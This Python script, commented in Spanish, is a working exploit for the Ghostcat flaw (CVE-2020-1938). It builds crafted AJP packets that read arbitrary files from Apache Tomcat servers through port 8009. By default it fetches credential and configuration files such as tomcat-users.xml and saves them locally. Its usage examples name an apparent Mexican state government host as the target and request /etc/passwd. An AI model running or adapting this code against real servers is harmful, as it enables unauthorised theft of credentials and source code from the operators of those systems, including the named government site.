#!/usr/bin/env python3
"""
Ghostcat - CVE-2020-1938 Exploit
Lee archivos del Tomcat via AJP connector (puerto 8009)
Uso: python3 ghostcat.py <host> [archivo]
"""

import socket
import sys
import struct

def pack_ajp_header(method, host, uri, headers=None):
    """Empaqueta un request AJP"""
    data = b''
    
    # Forward Request prefix
    prefix_code = 0x02  # FORWARD_REQUEST
    method_code = {
        'GET': 2,
        'POST': 4,
        'HEAD': 3,
        'OPTIONS': 1,
        'PUT': 5,
        'DELETE': 6,
        'TRACE': 7
    }.get(method.upper(), 2)
    
    # Protocol, method, headers
    data += struct.pack('!BB', prefix_code, method_code)
    
    # Protocol version (HTTP/1.1)
    data += b'\x00\x01'  # 1.1
    data += b'\x00\x00'  # host length (0 = use request host)
    data += b'\x00\x00'  # address length
    data += b'\x00\x00'  # server name length
    data += struct.pack('!H', 8009)  # server port
    data += b'\x00'  # is_ssl
    
    # Number of headers
    all_headers = {
        'accept-language': 'en-US,en;q=0.5',
    }
    if headers:
        all_headers.update(headers)
    all_headers['host'] = host
    all_headers['accept-charset'] = 'ISO-8859-1,utf-8;q=0.7,*;q=0.3'
    
    data += struct.pack('!H', len(all_headers))
    
    # Headers
    for key, value in all_headers.items():
        # Header name
        encoded_key = key.encode('utf-8')
        if len(encoded_key) > 0x7fff:
            encoded_key = encoded_key[:0x7fff]
        data += struct.pack('!H', len(encoded_key))
        data += encoded_key
        data += b'\x00'  # null terminator
        
        # Header value
        encoded_value = value.encode('utf-8')
        if len(encoded_value) > 0x7fff:
            encoded_value = encoded_value[:0x7fff]
        data += struct.pack('!H', len(encoded_value))
        data += encoded_value
        data += b'\x00'  # null terminator
    
    # Attributes (request_uri, etc)
    attributes = {
        'req_attribute': [
            ('remote_user', b''),
            ('auth_type', b''),
            ('query_string', b''),
            ('jvm_route', b''),
            ('secret', b''),
        ]
    }
    
    # request_uri attribute
    encoded_uri = uri.encode('utf-8')
    data += b'\x0B'  # CODE_REQ_ATTRIBUTE
    data += b'\x00\x0B'  # "request_uri" length
    data += b'request_uri'
    data += struct.pack('!H', len(encoded_uri))
    data += encoded_uri
    data += b'\x00'
    
    # Terminator
    data += b'\xFF'
    
    return data


def send_ajp(host, port, method, uri, file_to_read=None):
    """Envía request AJP y recibe respuesta"""
    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    sock.settimeout(10)
    
    try:
        sock.connect((host, port))
    except Exception as e:
        print(f"[-] Error conectando a {host}:{port}: {e}")
        return None
    
    # Construir el ataque Ghostcat:
    # Inyectar path traversal en los atributos AJP
    if file_to_read:
        # Usar javax.servlet.include.path_info para path traversal
        attributes = b''
        
        # request_uri normal
        uri_bytes = uri.encode('utf-8')
        
        # Construir el paquete manualmente para incluir path_info
        prefix = b'\x02\x02'  # FORWARD_REQUEST + GET method
        prefix += b'\x00\x01'  # HTTP/1.1
        prefix += b'\x00\x00'  # host_len
        prefix += b'\x00\x00'  # addr_len
        prefix += b'\x00\x00'  # server_name_len
        prefix += struct.pack('!H', 8009)  # port
        prefix += b'\x00'  # is_ssl
        
        # Headers
        prefix += b'\x00\x02'  # 2 headers
        # Host header
        prefix += b'\x00\x04' + b'host' + b'\x00'
        prefix += struct.pack('!H', len(host)) + host.encode() + b'\x00'
        # Accept header
        prefix += b'\x00\x06' + b'accept' + b'\x00'
        prefix += b'\x00\x03' + b'*/*' + b'\x00'
        
        # request_uri attribute (CODE 0x0B)
        prefix += b'\x0B'
        prefix += struct.pack('!H', 11) + b'request_uri'
        prefix += struct.pack('!H', len(uri_bytes)) + uri_bytes + b'\x00'
        
        # PATH_INFO ATTRIBUTE - Aquí va el path traversal
        path_info = file_to_read.encode('utf-8')
        prefix += b'\x0B'
        key = b'javax.servlet.include.path_info'
        prefix += struct.pack('!H', len(key)) + key
        prefix += struct.pack('!H', len(path_info)) + path_info + b'\x00'
        
        # SERVLET_PATH attribute
        prefix += b'\x0B'
        key2 = b'javax.servlet.include.servlet_path'
        prefix += struct.pack('!H', len(key2)) + key2
        prefix += b'\x00\x01' + b'/' + b'\x00'
        
        # Terminator
        prefix += b'\xFF'
        
        full_packet = prefix
    else:
        full_packet = pack_ajp_header(method, host, uri)
    
    # AJP packet format: [0x12, 0x34, data_length (2 bytes), data, ...]
    data_length = len(full_packet)
    ajp_packet = b'\x12\x34' + struct.pack('!H', data_length) + full_packet
    
    try:
        sock.send(ajp_packet)
        
        # Recibir respuesta
        response = b''
        while True:
            try:
                chunk = sock.recv(8192)
                if not chunk:
                    break
                response += chunk
                
                # Leer header AJP de respuesta
                if len(response) >= 4:
                    if response[0:2] == b'\x41\x42':  # AJP Response
                        resp_len = struct.unpack('!H', response[2:4])[0]
                        if len(response) >= resp_len + 4:
                            break
            except socket.timeout:
                break
    except Exception as e:
        print(f"[-] Error enviando datos: {e}")
    finally:
        sock.close()
    
    return response


def parse_ajp_response(data):
    """Parsea la respuesta AJP y extrae el contenido HTTP"""
    if not data or len(data) < 5:
        return "Sin respuesta"
    
    # Skip header AJP (4 bytes: AB, AB, len1, len2)
    if data[0:2] == b'\x41\x42':
        data = data[4:]
    
    # Buscar el inicio de los datos de respuesta (SEND_BODY_CHUNK = 0x03)
    result = b''
    i = 0
    
    while i < len(data):
        if data[i] == 0x03:  # SEND_BODY_CHUNK
            if i + 3 <= len(data):
                chunk_len = struct.unpack('!H', data[i+1:i+3])[0]
                if i + 3 + chunk_len <= len(data):
                    result += data[i+3:i+3+chunk_len]
                    i += 3 + chunk_len + 1  # +1 for null terminator
                    continue
            break
        elif data[i] == 0x04:  # END_RESPONSE
            break
        i += 1
    
    return result.decode('utf-8', errors='replace')


def exploit_ghostcat(host, port, file_to_read):
    """Ejecuta el exploit Ghostcat"""
    print(f"\n[*] Objetivo: {host}:{port}")
    print(f"[*] Archivo a leer: {file_to_read}")
    print(f"[*] Ejecutando Ghostcat (CVE-2020-1938)...\n")
    
    # El URI no importa mucho, usamos /manager/html como señuelo
    response = send_ajp(host, port, 'GET', '/', file_to_read=file_to_read)
    
    if response:
        result = parse_ajp_response(response)
        if result and len(result) > 10:
            print(f"[+] ¡ÉXITO! Archivo obtenido ({len(result)} bytes):\n")
            print(result)
            return result
        else:
            print(f"[-] Respuesta recibida pero sin contenido útil ({len(response)} bytes total)")
            print(f"[*] Headers raw: {response[:200]}")
    else:
        print("[-] No se recibió respuesta del servidor")
    
    return None


def main():
    if len(sys.argv) < 2:
        print("Ghostcat - CVE-2020-1938 Apache Tomcat AJP File Read")
        print(f"Uso: {sys.argv[0]} <host> [archivo] [puerto]")
        print(f"Ejemplo: {sys.argv[0]} efirma.veracruz.gob.mx WEB-INF/web.xml 8009")
        print(f"Ejemplo: {sys.argv[0]} efirma.veracruz.gob.mx /etc/passwd 8009")
        sys.exit(1)
    
    host = sys.argv[1]
    port = int(sys.argv[3]) if len(sys.argv) > 3 else 8009
    
    # Archivos a leer por defecto (los más útiles)
    default_files = [
        "WEB-INF/web.xml",           # Configuración web
        "WEB-INF/classes/application.properties",  # Props de app
        "conf/tomcat-users.xml",     # USUARIOS Y CONTRASEÑAS
        "conf/server.xml",           # Configuración del servidor
        "conf/web.xml",              # Configuración web global
        "index.jsp",                 # Código fuente
        "manager/WEB-INF/web.xml",   # Config del manager
        "host-manager/WEB-INF/web.xml"  # Config del host-manager
    ]
    
    if len(sys.argv) > 2:
        files_to_try = [sys.argv[2]]
    else:
        files_to_try = default_files
    
    for file_path in files_to_try:
        result = exploit_ghostcat(host, port, file_path)
        if result and len(result) > 100:
            print(f"\n{'='*60}")
            print(f"[+] ARCHIVO OBTENIDO: {file_path}")
            print(f"{'='*60}")
            
            # Guardar a archivo
            safe_name = file_path.replace('/', '_')
            with open(f'/tmp/ghostcat_{safe_name}', 'w') as f:
                f.write(result)
            print(f"[*] Guardado en: /tmp/ghostcat_{safe_name}")


if __name__ == "__main__":
    main()
